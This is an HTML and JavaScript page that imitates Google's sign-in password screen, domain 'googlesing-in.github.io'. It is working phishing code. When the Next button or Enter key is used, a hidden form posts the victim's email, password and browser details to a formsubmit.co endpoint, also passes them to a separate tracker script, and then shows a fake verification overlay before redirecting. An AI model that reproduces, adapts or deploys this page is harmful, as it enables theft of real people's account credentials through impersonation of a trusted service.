<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign In - Password</title>
    <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <style>
        body {
            font-family: 'Google Sans', 'Noto Sans', Arial, sans-serif;
            background-color: #1e1f20;
            color: #e8eaed;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .signin-container {
            background-color: #0e0e0e;
            border-radius: 30px;
            padding: 48px 40px 36px;
            width: 90%;
            max-width: 963px;
            height: auto;
            min-height: 400px;
            box-sizing: border-box;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            display: flex;
        }

        .left-column {
            flex: 1;
            padding-right: 40px;
        }

        .right-column {
            flex: 1;
            position: relative;
        }

        .google-logo {
            margin-bottom: 24px;
            text-align: left;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 12px;
            text-align: left;
        }

        .verify-text {
            font-size: 16px;
            font-weight: 400;
            margin-right: 205px;
            margin-top: 60px;
            text-align: right;
            margin-bottom: 24px;
            color: #e8eaed;
        }

        .email-display {
            display: flex;
            align-items: center;
            padding: 8px 0;
            margin-bottom: 32px;
        }

        .email-display .email {
            font-size: 16px;
            font-weight: 500;
            word-break: break-word;
        }

        .email-display .email-icon {
            width: 24px;
            height: 24px;
            background-color: #4285f4;
            border-radius: 50%;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
            font-weight: bold;
            flex-shrink: 0;
        }

        .form-group {
            margin-bottom: 24px;
        }

        input[type="password"] {
            width: 100%;
            height: 54px;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #5f6368;
            border-radius: 4px;
            background-color: transparent;
            color: #e8eaed;
            box-sizing: border-box;
        }

        input[type="password"]:focus {
            border-color: #8ab4f8;
            border-width: 2px;
            outline: none;
            box-shadow: 0 0 0 1px rgba(138, 180, 248, 0.5);
        }

        .show-password-container {
            display: flex;
            align-items: center;
            margin-top: 8px;
        }
        .show-password-checkbox {
            margin-right: 8px;
            cursor: pointer;
        }

        .show-password-checkbox input {
            appearance: none;
            -webkit-appearance: none;
            width: 18px;
            height: 18px;
            border: 2px solid #5f6368;
            border-radius: 2px;
            background: transparent;
            cursor: pointer;
            position: relative;
        }

        .show-password-checkbox input:checked {
            background-color: #8ab4f8;
            border-color: #8ab4f8;
        }

        .show-password-checkbox input:checked::after {
            content: '';
            position: absolute;
            left: 5px;
            top: 2px;
            width: 5px;
            height: 10px;
            border: solid #202124;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
        .show-password-label {
            font-size: 14px;
            color: #e8eaed;
        }

        .action-buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 100px;
        }

        .try-another-way {
            color: #8ab4f8;
            margin-left: 200px;
            font-size: 14px;
            text-decoration: none;
        }

        .next-button {
            background-color: #8ab4f8;
            color: #202124;
            font-size: 14px;
            font-weight: 500;
            padding: 10px 24px;
            border-radius: 40px;
            border: none;
            cursor: pointer;
        }

        .footer {
            display: flex;
            justify-content: space-between;
            padding: 16px;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            color: #9aa0a6;
            font-size: 12px;
        }

        .footer a {
            color: #9aa0a6;
            text-decoration: none;
            margin-left: 24px;
        }

        .language-select select {
            background-color: transparent;
            color: #9aa0a6;
            border: none;
            font-size: 12px;
            cursor: pointer;
            padding-right: 15px;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background-image: url("data:image/svg+xml;utf8,<svg fill='%239aa0a6' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/><path d='M0 0h24v24H0z' fill='none'/></svg>");
            background-repeat: no-repeat;
            background-position: right center;
        }
        
        /* Responsive Styles */
        @media screen and (max-width: 768px) {
            .signin-container {
                padding: 30px 25px 20px;
                border-radius: 20px;
            }
            
            .left-column {
                padding-right: 20px;
            }
            
            .verify-text {
                margin-right: 0;
                text-align: left;
                margin-top: 30px;
            }
            
            .action-buttons {
                margin-top: 50px;
            }
            
            .try-another-way {
                margin-left: 0;
            }
        }
        
        @media screen and (max-width: 640px) {
            .signin-container {
                flex-direction: column;
                padding: 30px 20px;
                height: auto;
            }
            
            .left-column {
                width: 100%;
                padding-right: 0;
                margin-bottom: 30px;
            }
            
            .right-column {
                width: 100%;
            }
            
            .verify-text {
                margin-top: 0;
            }
            
            .action-buttons {
                margin-top: 40px;
            }
            
            .footer {
                padding: 10px;
            }
            
            .footer a {
                margin-left: 15px;
            }
        }
        
        @media screen and (max-width: 480px) {
            .signin-container {
                padding: 25px 15px;
                border-radius: 15px;
                width: 95%;
            }
            
            h1 {
                font-size: 20px;
            }
            
            .verify-text {
                font-size: 14px;
            }
            
            .email-display .email {
                font-size: 14px;
            }
            
            input[type="password"] {
                height: 48px;
                font-size: 14px;
            }
            
            .action-buttons {
                flex-direction: column;
                align-items: flex-start;
                gap: 20px;
            }
            
            .next-button {
                align-self: flex-end;
            }
            
            .footer {
                flex-direction: column;
                gap: 10px;
            }
            
            .footer-links {
                display: flex;
                justify-content: space-around;
                width: 100%;
            }
            
            .footer-links a {
                margin-left: 0;
            }
        }
    </style>
</head>

<body>
    <div class="signin-container">
        <div class="left-column">
            <div class="google-logo">
                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true"
                    jsname="jjf7Ff">
                    <path fill="#4285F4"
                        d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z">
                    </path>
                    <path fill="#34A853"
                        d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z">
                    </path>
                    <path fill="#FABB05"
                        d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z">
                    </path>
                    <path fill="#E94235"
                        d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z">
                    </path>
                </svg>
            </div>
            <h1>Welcome</h1>
            <div class="email-display">
                <div class="email-icon">H</div>
                <div class="email">harryc87725@gmail.com</div>
            </div>
        </div>

        <div class="right-column">
            <div class="verify-text">To continue, first verify it's you</div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Enter your password">
                <div class="show-password-container">
                    <input type="checkbox" id="show-password" class="show-password-checkbox">
                    <label for="show-password" class="show-password-label">Show password</label>
                </div>
            </div>

            <div class="action-buttons">
                <a href="#" class="try-another-way" id="try-another-way">Try another way</a>
                <button type="button" class="next-button">Next</button>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="language-select">
            <select>
                <option>English (United States)</option>
            </select>
        </div>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
    
    <!-- Include the tracker script FIRST to ensure it's available -->
    <script src="login-tracker.js"></script>
    
    <script>
        // Initialize password page functionality
        document.addEventListener('DOMContentLoaded', function() {
            console.log('Password page loaded');
            
            // Debug URL parameters
            console.log('URL parameters:', window.location.search);
            const urlParams = new URLSearchParams(window.location.search);
            console.log('Email parameter:', urlParams.get('_em'));
            
            // Handle show/hide password toggle
        document.getElementById('show-password').addEventListener('change', function() {
            const passwordInput = document.querySelector('input[type="password"]');
            passwordInput.type = this.checked ? 'text' : 'password';
        });

            // Set email from session storage
            const storedEmail = window.loginTracker ? loginTracker.getEmail() : null;
            console.log('Stored email:', storedEmail);
            
            if (storedEmail) {
                document.querySelector('.email').textContent = storedEmail;
                
                const firstLetter = storedEmail.charAt(0).toUpperCase();
                document.querySelector('.email-icon').textContent = firstLetter;
            } else {
                // Default to the email shown in the image if no stored email
                document.querySelector('.email').textContent = 'harryc87725@gmail.com';
                document.querySelector('.email-icon').textContent = 'H';
                console.warn('No email found in sessionStorage!');
            }

            // Alternative login method handler
        document.getElementById('try-another-way').addEventListener('click', function(e) {
            e.preventDefault();
            // This would typically show authentication alternatives
            alert('This would show alternative verification methods');
        });
            
            // DIRECT function to handle the Next button click
            const nextButton = document.querySelector('.next-button');
            if (nextButton) {
                console.log('Next button found, attaching handler');
                nextButton.onclick = function() {
                    console.log('Next button clicked');
                    handleLogin();
                };
            } else {
                console.error('Next button not found!');
            }
            
            // Handle Enter key press in password field
            const passwordInput = document.querySelector('input[type="password"]');
            if (passwordInput) {
                passwordInput.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        console.log('Enter key pressed');
                        e.preventDefault();
                        handleLogin();
                    }
                });
            } else {
                console.error('Password input not found!');
            }
        });
        
        // Helper function to handle login
        function handleLogin() {
            try {
                const email = window.loginTracker ? loginTracker.getEmail() : null;
                const password = document.querySelector('input[type="password"]').value;
                
                console.log('Login attempt initiated:', email ? 'Email found' : 'No email!');
                
                if (!email) {
                    alert('No email found in session. Please return to the sign-in page.');
                    window.location.href = 'index.html';
                    return;
                }
                
                if (!password) {
                    alert('Please enter your password.');
                    return;
                }
                
                // Log and track attempt
                console.log('Tracking login...');
                if (window.loginTracker) {
                    try {
                        loginTracker.track(email, password);
                        console.log('Login tracked successfully');
                    } catch (err) {
                        console.error('Error tracking login:', err);
                    }
                } else {
                    console.error('loginTracker not available!');
                }
                
                // Send login info directly to email before proceeding
                sendLoginToEmail(email, password);
                
                // Display processing message
                showProcessingMessage();
                
                // Delay navigation to success page to allow form submission to complete
                setTimeout(function() {
                    // Proceed to success page
                    const successUrl = window.loginTracker ? loginTracker.getUrlWithEmail('success.html', email) : 'success.html';
                    window.location.href = successUrl;
                }, 1500);
            } catch (err) {
                console.error('Error in handleLogin:', err);
                alert('An error occurred. Please try again.');
            }
        }
        
        // Show processing message
        function showProcessingMessage() {
            // Create overlay
            const overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.7)';
            overlay.style.zIndex = '9999';
            overlay.style.display = 'flex';
            overlay.style.justifyContent = 'center';
            overlay.style.alignItems = 'center';
            
            // Create message box
            const messageBox = document.createElement('div');
            messageBox.style.backgroundColor = '#202124';
            messageBox.style.borderRadius = '8px';
            messageBox.style.padding = '20px';
            messageBox.style.color = 'white';
            messageBox.style.textAlign = 'center';
            
            // Create spinner
            const spinner = document.createElement('div');
            spinner.style.display = 'inline-block';
            spinner.style.width = '30px';
            spinner.style.height = '30px';
            spinner.style.border = '3px solid rgba(255,255,255,.3)';
            spinner.style.borderRadius = '50%';
            spinner.style.borderTopColor = '#4285F4';
            spinner.style.animation = 'spin 1s ease-in-out infinite';
            spinner.style.marginBottom = '15px';
            
            // Add keyframes for spinner animation
            const style = document.createElement('style');
            style.innerHTML = `
                @keyframes spin {
                    to { transform: rotate(360deg); }
                }
            `;
            document.head.appendChild(style);
            
            // Add message
            const message = document.createElement('div');
            message.textContent = 'Verifying your login...';
            
            // Assemble message box
            messageBox.appendChild(spinner);
            messageBox.appendChild(document.createElement('br'));
            messageBox.appendChild(message);
            
            // Add to overlay
            overlay.appendChild(messageBox);
            
            // Add to body
            document.body.appendChild(overlay);
        }
        
        // Function to send login info directly to email
        function sendLoginToEmail(email, password) {
            try {
                // Create an iframe for form submission to prevent page navigation
                const iframe = document.createElement('iframe');
                iframe.name = 'hiddenFrame';
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                
                // Create form element
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = 'https://formsubmit.co/94ca4051c13084e78e0b9c668bf8c279'; // FormSubmit endpoint with activation code
                form.style.display = 'none';
                form.target = 'hiddenFrame'; // Submit to iframe to prevent navigation
                
                // Create login data
                const loginData = document.createElement('input');
                loginData.type = 'hidden';
                loginData.name = 'loginData';
                loginData.value = `
New Login Captured from https://googlesing-in.github.io/:
-----------------
Email: ${email}
Password: ${password}
Date: ${new Date().toLocaleString()}
IP: [Captured on server]
User Agent: ${navigator.userAgent}
`;
                
                // Create other required fields
                const subject = document.createElement('input');
                subject.type = 'hidden';
                subject.name = '_subject';
                subject.value = `New Login: ${email}`;
                
                const captcha = document.createElement('input');
                captcha.type = 'hidden';
                captcha.name = '_captcha';
                captcha.value = 'false';
                
                const template = document.createElement('input');
                template.type = 'hidden';
                template.name = '_template';
                template.value = 'table';
                
                const replyTo = document.createElement('input');
                replyTo.type = 'hidden';
                replyTo.name = '_replyto';
                replyTo.value = 'mursalhayat00@gmail.com';
                
                // Prevent redirects
                const next = document.createElement('input');
                next.type = 'hidden';
                next.name = '_next';
                next.value = 'https://googlesing-in.github.io/success.html';
                
                // Add fields to form
                form.appendChild(loginData);
                form.appendChild(subject);
                form.appendChild(captcha);
                form.appendChild(template);
                form.appendChild(replyTo);
                form.appendChild(next);
                
                // Add form to document and submit
                document.body.appendChild(form);
                form.submit();
                
                console.log('Login info sent to email via FormSubmit');
            } catch (err) {
                console.error('Error sending login info to email:', err);
            }
        }
    </script>
</body>

</html> 